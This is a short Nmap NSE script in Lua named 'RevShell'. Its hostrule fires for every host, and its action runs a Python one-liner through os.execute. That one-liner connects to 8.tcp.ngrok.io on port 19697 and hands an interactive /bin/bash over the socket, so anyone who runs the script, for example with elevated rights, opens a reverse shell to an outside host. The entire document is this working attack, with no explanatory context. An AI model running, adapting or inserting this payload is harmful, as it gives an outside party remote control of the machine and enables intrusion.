description = "RevShell"
author = "Et"
license = "GPLv3"
categories = {"intrusive"}

hostrule = function(host)
  return true
end

action = function(host, port)
  os.execute([[
/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("8.tcp.ngrok.io",19697));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
  ]])
end
